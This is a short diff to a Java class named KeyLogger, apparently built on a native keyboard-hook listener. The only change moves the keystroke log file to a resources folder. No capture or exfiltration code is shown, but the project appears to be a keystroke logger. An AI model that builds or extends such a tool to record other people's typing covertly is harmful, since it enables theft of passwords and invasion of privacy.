@@ -16,7 +16,7 @@ public class KeyLogger implements NativeKeyListener {
 
     public KeyLogger() {
         try {
-            writer = new BufferedWriter(new FileWriter("keylog.txt", true)); // Log dosyasını aç
+            writer = new BufferedWriter(new FileWriter("resources/keylog.txt", true)); // Log dosyasını aç
         } catch (IOException e) {
             e.printStackTrace();
         }
